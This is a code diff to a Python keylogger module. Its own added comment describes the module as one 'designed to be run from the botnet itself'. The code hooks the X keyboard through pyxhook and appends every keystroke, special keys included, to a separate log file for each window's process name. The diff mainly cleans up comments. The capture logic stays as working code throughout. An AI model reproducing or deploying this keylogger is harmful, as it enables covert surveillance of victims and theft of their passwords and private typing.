@@ -3,6 +3,11 @@ import sys
 import os
 import errno
 
+# This module is a basic keylogging module which will create a log
+# for each different window. It uses the pyxhook library to hook into
+# X, so this only works on linux machines. It's designed to be run from 
+# the botnet itself.
+
 path = None
 def main():
 	if (len(sys.argv) < 2):
@@ -20,7 +25,6 @@ def main():
 	hook.HookKeyboard()
 	hook.start()
 def run():
-	#path = sys.argv[1]
 	path = 'logfolder'
 	try: 
 	    os.makedirs(path)
@@ -55,25 +59,15 @@ def catchSpecial(key):
 		return '[Escape]'
 	else:
 		return key
-#this will create a log for each different window so its easier to know what program corresponds to what key presses
+# This will create a log for each different window so its easier 
+# to know what program corresponds to what key presses
 def logkey(event):
-	#curwin = 
-	#print event.Window
-	#print event.WindowName
-	#print event.WindowProcName
-	# if __name__ == '__main__':
+
 	path = sys.argv[1]
-	# else:
-	#path = 'logfolder'
 	logname = path+'/'+str(event.WindowProcName).strip() + ".log"
 	f=open(logname,'a')
-	#f.write(event.WindowProcName)
-	#f.write('\n')
-	#print event.Ascii
 	f.write(catchSpecial(event.Key))
-	#f.write(chr(event.Ascii))
 	f.close()
-	#f.write('\n')
 
 if __name__ == '__main__':
 	main()
